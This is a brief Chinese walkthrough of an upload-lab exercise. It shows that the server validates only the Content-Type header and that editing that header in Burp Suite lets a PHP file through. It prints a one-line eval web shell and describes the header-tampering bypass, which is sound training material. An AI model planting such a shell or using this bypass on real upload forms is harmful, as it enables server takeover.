## 解题wp(By:独立团孙德胜Alan)
本pass在服务端对数据包的MIME进行检查！

## 1.打开第二关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)

#### 提示不允许上传。

### 3.分析代码

![](./img/3.png)

#### 发现原来是检测了Content-Type头，于是我们可以通过修改头的方式绕过。

### 4.对于验证了MIME的问题，我们可以使用Burpsutie抓包，修改Content-Type，绕过验证。

![](./img/4.png)